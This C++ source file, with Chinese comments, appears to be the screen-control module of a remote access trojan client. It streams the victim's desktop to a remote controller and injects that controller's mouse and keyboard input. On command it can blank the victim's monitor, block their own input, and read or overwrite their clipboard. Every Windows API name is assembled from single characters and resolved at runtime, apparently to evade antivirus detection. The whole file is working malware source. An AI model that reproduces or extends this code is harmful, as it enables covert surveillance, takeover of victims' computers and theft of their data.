// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

//#define _WIN32_WINNT	0x0400   //vc6.0
#define _WIN32_WINNT	0x0501   //vc2008
#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include "ScreenManager.h"
#include "until.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;

//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_SCAN;
	m_biBitCount = 8;    //默认4位彩色
	m_pScreenSpy = new CScreenSpy(m_biBitCount);   
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);
}

CScreenManager::~CScreenManager()
{
    char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
    WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	pInterlockedExchange((LPLONG)&m_bIsBlankScreen, false);
	pInterlockedExchange((LPLONG)&m_bIsWorking, false);
	pWaitForSingleObject(m_hWorkThread, INFINITE);
	pWaitForSingleObject(m_hBlankThread, INFINITE);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(m_hWorkThread);
	pCloseHandle(m_hBlankThread);

	if (m_pScreenSpy)
		delete m_pScreenSpy;
}

void CScreenManager::ResetScreen(int biBitCount)
{
	m_bIsWorking = false;
    char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
    WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pWaitForSingleObject(m_hWorkThread, INFINITE);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(m_hWorkThread);

	delete m_pScreenSpy;

	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CScreenSpy(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CScreenSpy(8, true);
	else
		m_pScreenSpy = new CScreenSpy(biBitCount);

	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);

	m_biBitCount = biBitCount;

	m_bIsWorking = true;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	char JtQBs07[] = {'B','l','o','c','k','I','n','p','u','t','\0'};
	BlockInputT pBlockInput=(BlockInputT)GetProcAddress(LoadLibrary("USER32.dll"),JtQBs07);
	try
	{
 		switch (lpBuffer[0])
 		{
		case COMMAND_NEXT:
			{
			    // 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
			    NotifyDialogIsOpen();
			}
			break;
		case COMMAND_SCREEN_RESET:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);   //改变分辨率及颜色
			break;
		case COMMAND_ALGORITHM_RESET:
			{
			    m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			    m_pScreenSpy->setAlgorithm(m_bAlgorithm);
			}
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL:
			{
			    ::SimulateCtrlAltDel();
			    ResetScreen(m_biBitCount);   //刷新分辨率及颜色
			}
			break;
		case COMMAND_SCREEN_CONTROL:
			{
				// 远程仍然可以操作
				pBlockInput(false);
				ProcessCommand(lpBuffer + 1, nSize - 1);
				pBlockInput(m_bIsBlockInput);
			}
			break;
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
			m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_BLANK:
			m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER:
			m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		default:
			break;
		}
	}catch(...){}
}

void CScreenManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	char FBwWp28[] = {'V','i','r','t','u','a','l','A','l','l','o','c','\0'};
	VirtualAllocT pVirtualAlloc=(VirtualAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp28);
	LPBYTE	lpBuffer = (LPBYTE)pVirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	Gyfunction->my_memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);

	VirtualFreeT pVirtualFree=(VirtualFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"VirtualFree");
	pVirtualFree(lpBuffer, 0, MEM_RELEASE);	
}

void CScreenManager::sendFirstScreen()
{
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;

	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
		return;

	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	Gyfunction->my_memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

void CScreenManager::sendNextScreen()
{
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	
	if (dwBytes == 0 || !lpNetScreen)
		return;

	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	
	lpBuffer[0] = TOKEN_NEXTSCREEN;
	Gyfunction->my_memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);


	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;
}

DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
{
	CScreenManager *pThis = (CScreenManager *)lparam;

	pThis->sendBITMAPINFO();
	// 等控制端对话框打开

	pThis->WaitForDialogOpen();

	pThis->sendFirstScreen();
	try // 控制端强制关闭时会出错
    {
		while (pThis->m_bIsWorking)
			pThis->sendNextScreen();
	}catch(...){};

	return 0;
}

// 创建这个线程主要是为了保持一直黑屏
DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
{
	static	bool bIsScreenBlanked = false;
	CScreenManager *pThis = (CScreenManager *)lparam;
    char CtxPW51[] = {'S','e','n','d','M','e','s','s','a','g','e','A','\0'};
    SendMessageAT pSendMessageA=(SendMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW51);
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);

	char JtQBs07[] = {'B','l','o','c','k','I','n','p','u','t','\0'};
	BlockInputT pBlockInput=(BlockInputT)GetProcAddress(LoadLibrary("USER32.dll"),JtQBs07);
	
	char DYrEN56[] = {'S','y','s','t','e','m','P','a','r','a','m','e','t','e','r','s','I','n','f','o','A','\0'};
    SystemParametersInfoAT pSystemParametersInfoA=(SystemParametersInfoAT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN56);
	while (pThis->IsConnect())
	{
		// 加快反应速度
		for (int i = 0; i < 100; i++)
		{
			if (pThis->IsConnect())
			{
				// 分辨率大小改变了
				if (pThis->IsMetricsChange())
					pThis->ResetScreen(pThis->GetCurrentPixelBits());
				pSleep(10);
			}
			else
				break;
		}
		if (pThis->m_bIsBlankScreen)
		{
			pSystemParametersInfoA(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			pSendMessageA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else
		{
			if (bIsScreenBlanked)
			{
				pSystemParametersInfoA(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
				pSendMessageA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
				bIsScreenBlanked = false;
			}
		}
		pBlockInput(pThis->m_bIsBlockInput);

		// 分辨率大小改变了
		if (pThis->IsMetricsChange())
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
	}

	pBlockInput(false);
	return -1;
}

void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
{
	// 数据包不合法
	if (nSize % sizeof(MSG) != 0)
		return;

	SwitchInputDesktop();

	// 命令个数
	int	nCount = nSize / sizeof(MSG);

	char DYrEN58[] = {'S','e','t','C','a','p','t','u','r','e','\0'};
	SetCaptureT pSetCapture=(SetCaptureT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN58);
	char DYrEN59[] = {'W','i','n','d','o','w','F','r','o','m','P','o','i','n','t','\0'};
	WindowFromPointT pWindowFromPoint=(WindowFromPointT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN59);
	char DYrEN60[] = {'S','e','t','C','u','r','s','o','r','P','o','s','\0'};
    SetCursorPosT pSetCursorPos=(SetCursorPosT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN60);
	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
			case WM_LBUTTONDOWN:
			case WM_LBUTTONUP:
			case WM_RBUTTONDOWN:
			case WM_RBUTTONUP:
			case WM_MOUSEMOVE:
			case WM_LBUTTONDBLCLK:
			case WM_RBUTTONDBLCLK:
			case WM_MBUTTONDOWN:
			case WM_MBUTTONUP:
				{
					POINT point;
					point.x = LOWORD(pMsg->lParam);
					point.y = HIWORD(pMsg->lParam);
					pSetCursorPos(point.x, point.y);
					pSetCapture(pWindowFromPoint(point));
				}
				break;
			default:
				break;
		}

		char CtxPW65[] = {'k','e','y','b','d','_','e','v','e','n','t','\0'};
        keybd_eventT pkeybd_event=(keybd_eventT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW65);
        char CtxPW66[] = {'M','a','p','V','i','r','t','u','a','l','K','e','y','A','\0'};
        MapVirtualKeyAT pMapVirtualKeyA=(MapVirtualKeyAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW66);
		char DYrEN57[] = {'m','o','u','s','e','_','e','v','e','n','t','\0'};
		mouse_eventT pmouse_event=(mouse_eventT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN57);
		switch(pMsg->message)
		{
			case WM_LBUTTONDOWN:
				pmouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				break;
			case WM_LBUTTONUP:
				pmouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				break;
			case WM_RBUTTONDOWN:
				pmouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				break;
			case WM_RBUTTONUP:
				pmouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				break;
 			case WM_LBUTTONDBLCLK:
				pmouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				pmouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 				break;
 			case WM_RBUTTONDBLCLK:
 				pmouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				pmouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONDOWN:
				pmouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONUP:
				pmouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
				break;
			case WM_MOUSEWHEEL:
				pmouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
				break;
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
				pkeybd_event(pMsg->wParam, pMapVirtualKeyA(pMsg->wParam, 0), 0, 0);
				break;	
			case WM_KEYUP:
			case WM_SYSKEYUP:
				pkeybd_event(pMsg->wParam, pMapVirtualKeyA(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
				break;
			default:
				break;
		}
	}	
}

void CScreenManager::UpdateLocalClipboard( char *buf, int len )
{
	char DYrEN71[] = {'O','p','e','n','C','l','i','p','b','o','a','r','d','\0'};
	OpenClipboardT pOpenClipboard=(OpenClipboardT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN71);
//	if (!::OpenClipboard(NULL))
	if (!pOpenClipboard(NULL))
		return;
	
	char DYrEN63[] = {'E','m','p','t','y','C','l','i','p','b','o','a','r','d','\0'};
    EmptyClipboardT pEmptyClipboard=(EmptyClipboardT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN63);
//	::EmptyClipboard();
	pEmptyClipboard();
	char GxYeq02[] = {'G','l','o','b','a','l','A','l','l','o','c','\0'};
	GlobalAllocT pGlobalAlloc=(GlobalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),GxYeq02);
	GlobalLockT pGlobalLock=(GlobalLockT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GlobalLock");
	char Wffkl01[] = {'G','l','o','b','a','l','U','n','l','o','c','k','\0'};
    GlobalUnlockT pGlobalUnlock=(GlobalUnlockT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
	char GxYeq03[] = {'G','l','o','b','a','l','F','r','e','e','\0'};
	GlobalFreeT pGlobalFree=(GlobalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),GxYeq03);

	char DYrEN62[] = {'S','e','t','C','l','i','p','b','o','a','r','d','D','a','t','a','\0'};
	SetClipboardDataT pSetClipboardData=(SetClipboardDataT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN62);
	HGLOBAL hglbCopy = pGlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL) { 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) pGlobalLock(hglbCopy); 
		Gyfunction->my_memcpy(lptstrCopy, buf, len); 
		pGlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		pSetClipboardData(CF_TEXT, hglbCopy);
		pGlobalFree(hglbCopy);
	}
	char JtQBs05[] = {'C','l','o','s','e','C','l','i','p','b','o','a','r','d','\0'};
	CloseClipboardT pCloseClipboard=(CloseClipboardT)GetProcAddress(LoadLibrary("USER32.dll"),JtQBs05);
	pCloseClipboard();
}

void CScreenManager::SendLocalClipboard()
{
	char DYrEN71[] = {'O','p','e','n','C','l','i','p','b','o','a','r','d','\0'};
	OpenClipboardT pOpenClipboard=(OpenClipboardT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN71);
//	if (!::OpenClipboard(NULL))
	if (!pOpenClipboard(NULL))
		return;
	char DYrEN65[] = {'G','e','t','C','l','i','p','b','o','a','r','d','D','a','t','a','\0'};
	GetClipboardDataT pGetClipboardData=(GetClipboardDataT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN65);
	HGLOBAL hglb = pGetClipboardData(CF_TEXT);
	char JtQBs05[] = {'C','l','o','s','e','C','l','i','p','b','o','a','r','d','\0'};
	CloseClipboardT pCloseClipboard=(CloseClipboardT)GetProcAddress(LoadLibrary("USER32.dll"),JtQBs05);
	if (hglb == NULL)
	{
//		::CloseClipboard();
		pCloseClipboard();
		return;
	}
	GlobalSizeT pGlobalSize=(GlobalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GlobalSize");
	int	nPacketLen = pGlobalSize(hglb) + 1;
	GlobalLockT pGlobalLock=(GlobalLockT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GlobalLock");
	LPSTR lpstr = (LPSTR) pGlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	Gyfunction->my_memcpy(lpData + 1, lpstr, nPacketLen - 1);
	char Wffkl01[] = {'G','l','o','b','a','l','U','n','l','o','c','k','\0'};
    GlobalUnlockT pGlobalUnlock=(GlobalUnlockT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
	pGlobalUnlock(hglb); 
//	::GlobalUnlock(hglb); 
//	::CloseClipboard();
	pCloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}


// 屏幕分辨率是否发生改变
bool CScreenManager::IsMetricsChange()
{
	LPBITMAPINFO	lpbmi =	m_pScreenSpy->getBI();

	char DYrEN67[] = {'G','e','t','S','y','s','t','e','m','M','e','t','r','i','c','s','\0'};
	GetSystemMetricsT pGetSystemMetrics=(GetSystemMetricsT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN67);
//	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) || 
//	    (lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
	return (lpbmi->bmiHeader.biWidth != pGetSystemMetrics(SM_CXSCREEN)) || 
		(lpbmi->bmiHeader.biHeight != pGetSystemMetrics(SM_CYSCREEN));
}

bool CScreenManager::IsConnect()
{
	return m_pClient->IsRunning();
}

int CScreenManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}